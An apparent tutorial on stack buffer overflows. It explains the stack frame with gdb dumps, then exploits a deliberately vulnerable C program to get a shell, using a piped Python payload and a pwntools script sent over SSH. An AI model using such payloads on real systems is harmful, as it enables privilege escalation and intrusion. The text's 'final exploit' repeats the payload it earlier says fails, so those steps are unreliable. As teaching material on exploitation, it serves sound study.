# Buffer overflow

So, as I wrote before this vulnerability allows you to overwrite data.

## Structure within the stack

Suppose that we have a follow program:
```C
#include <stdlib.h>
/*
This program is simple as possible
*/

// Compile with:
// gcc stack-example.c -o stack-example -m32
// -m32 option is just for better explanation

int some_func1(int a, int b, int c, int d, int e, int f){
  int result = some_func2(e, f);
  return a + b + c + d + result;
}

int some_func2(int e, int f){
  int argv[10];
  short ind;
  size_t len = 10;
  for(ind = 0; ind < 10; ind++){
    argv[ind] = ind;
  }
  return e * f;
}

int main(int argc, char *argv[]){
  int a = 1, b = 2, c = 3, d=4, e=5, f=6;
  int result = some_func1(a, b, c, d, e, f);
  return 0;
}
```

When the program starts, the stack contains the argc and argv arguments to the main function (also envp).
When a new function is executed, its arguments are moved either to registers (for example, `rax`, `rbx`, `rcx`, `rdx`, `rdi`, `rsi` in Intel x86-64), or directly onto the stack (via `push 0x1` type of instructions).

Let's take a look at the assembly instructions within main:

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x5655620c <+0>:	lea    ecx,[esp+0x4]
   0x56556210 <+4>:	and    esp,0xfffffff0
   0x56556213 <+7>:	push   DWORD PTR [ecx-0x4]
   0x56556216 <+10>:	push   ebp
   0x56556217 <+11>:	mov    ebp,esp
   0x56556219 <+13>:	push   ecx
   0x5655621a <+14>:	sub    esp,0x24
   0x5655621d <+17>:	call   0x5655627e <__x86.get_pc_thunk.ax>
   0x56556222 <+22>:	add    eax,0x2dde
   0x56556227 <+27>:	mov    DWORD PTR [ebp-0xc],0x1
   0x5655622e <+34>:	mov    DWORD PTR [ebp-0x10],0x2
   0x56556235 <+41>:	mov    DWORD PTR [ebp-0x14],0x3
   0x5655623c <+48>:	mov    DWORD PTR [ebp-0x18],0x4
   0x56556243 <+55>:	mov    DWORD PTR [ebp-0x1c],0x5
   0x5655624a <+62>:	mov    DWORD PTR [ebp-0x20],0x6
   0x56556251 <+69>:	sub    esp,0x8
   0x56556254 <+72>:	push   DWORD PTR [ebp-0x20]
   0x56556257 <+75>:	push   DWORD PTR [ebp-0x1c]
   0x5655625a <+78>:	push   DWORD PTR [ebp-0x18]
   0x5655625d <+81>:	push   DWORD PTR [ebp-0x14]
   0x56556260 <+84>:	push   DWORD PTR [ebp-0x10]
   0x56556263 <+87>:	push   DWORD PTR [ebp-0xc]
   0x56556266 <+90>:	call   0x56556189 <some_func1>
   0x5655626b <+95>:	add    esp,0x20
   0x5655626e <+98>:	mov    DWORD PTR [ebp-0x24],eax
   0x56556271 <+101>:	mov    eax,0x0
   0x56556276 <+106>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x56556279 <+109>:	leave  
   0x5655627a <+110>:	lea    esp,[ecx-0x4]
   0x5655627d <+113>:	ret    
End of assembler dump.
gef➤  

```

You can see that here we are pushing 1, 2, 3, 4, 5, 6 onto the stack at ebp - some offset. `ebp` is just a base pointer that is placed at the bottom of the stack portion of the currently called function.
EBP also provides access to the required address on the stack where the values ​​of the variables are stored. So, when you declare the first variable in a function and set some value for it, for example, int value = 4, you can access it with `ebp - 0x4`. If you have a buffer of integers, for example, 10 in size, you can access it with `ebp - 0x28`. Etc.

Proof of concept:
```bash
gef>  b *some_func1 + 11
gef➤  x/50wx $ebp
0xffffd1d8:	0xffffd228	0x5655626b	0x00000001	0x00000002
0xffffd1e8:	0x00000003	0x00000004	0x00000005	0x00000006
0xffffd1f8:	0x00000000	0x56556222	0xf7fb13fc	0x56559000
0xffffd208:	0x00000006	0x00000005	0x00000004	0x00000003
0xffffd218:	0x00000002	0x00000001	0xf7fe4520	0xffffd240
0xffffd228:	0x00000000	0xf7df1b41	0xf7fb1000	0xf7fb1000
0xffffd238:	0x00000000	0xf7df1b41	0x00000002	0xffffd2d4
0xffffd248:	0xffffd2e0	0xffffd264	0x00000001	0x00000000
0xffffd258:	0xf7fb1000	0xffffffff	0xf7ffd000	0x00000000
0xffffd268:	0xf7fb1000	0xf7fb1000	0x00000000	0xc574ab7c
0xffffd278:	0x84e62d6c	0x00000000	0x00000000	0x00000000
0xffffd288:	0x00000002	0x56556050	0x00000000	0xf7fe9690
0xffffd298:	0xf7fe4520	0x56559000
```

At the address of `0xffffd1d8` - `0xffffd1e8` you can see our values 1, 2, 3, 4, 5, 6. But before them you can see the address `0x5655626b` which is just the address of the next assembly instruction after `some_func1` call. This is a return address, and the `ret` instruction will take it and place it in `eip` register which holds the address of the next instruction to execute.

## Exploitation

So, I wrote a simple program that has a part with a `system` Unix syscall to execute `/bin/sh`. You need to compile it without stack protection.

```C
#include <unistd.h>

//  gcc buffer-overflow.c -o buffer-overflow -fno-stack-protector

int main(int argc, char *argv[]){
  char vuln_buff[100];
  int access = 4321;
  // vulnerable
  gets(vuln_buff);
  if (access == 1234){
    setuid(0);
    system("/bin/sh");
  }
  return 0;
}
```

Also, it used the vulnerable function `gets`. But this is vulnerable because it doesn't check the input size. It may be also a programming mistake with `read`.
Okay, we know the size of buffer, buf if we wouldn't know, then you can see it in the gdb:

```bash
0x0000000000001183 <+26>:	lea    rax,[rbp-0x70]
0x0000000000001187 <+30>:	mov    rdi,rax
0x000000000000118a <+33>:	mov    eax,0x0
0x000000000000118f <+38>:	call   0x1070 <gets@plt>
```

Line `+26` shows you that for some reasons, buffer size in machine code is 112 bytes. So, you can exploit it:

```bash
gcc buf-overflow.c -o buffer-overflow -fno-stack-protector
(python -c 'print "A"*112 + "\xdd\xdd"'; cat) | ./buffer-overflow
```

But, you don't get a shell, cause you overwrote the access variable with `0xdddd`. You can with what hex address it compares in the gdb:

```bash
   0x0000000000001194 <+43>:	cmp    DWORD PTR [rbp-0x4],0x4d2
```

So, your final exploit:

```bash
(python -c 'print "A"*112 + "\xdd\xdd"'; cat) | ./buffer-overflow
```

And you will get a shell, but you will be you, not the other user or root. Yeah, in this kind of program, the vulnerability is useless for an attacker, but if it has a `suid` bit set(`chmod ug+s buffer-overflow` as another user), he can get a root or another user privilege. But, if a program with some network interactions has this vulnerability, then the attacker can get Remote Code Execution or RCE, even if the program doesn't have a suid on the root or other user. Also, the main reason for RCE here is the condition which gives a shell, but even so, this vulnerability opens a thread to further exploitation.


### Remote exploit with pwntools

Here the exploit to this program using `pwntools` python module:
```python
from pwn import *

# Connect to target via ssh
con = ssh('user', '192.168.43.61', password='user', port=22)
# Execute a vulnerable program
p = con.process('./buffer-overflow')
# Payload
payload = "A"*108 + "\xd2\x04"
# Send payload
p.sendline(payload)
# To attach with gdb to remote process
#gdb.attach(p, "b *main")
# Now, you can work with shell interactively
p.interactive()
```

One difference here is the offset between the buffer and the value to overwrite. This offset often can be different from the local exploit.
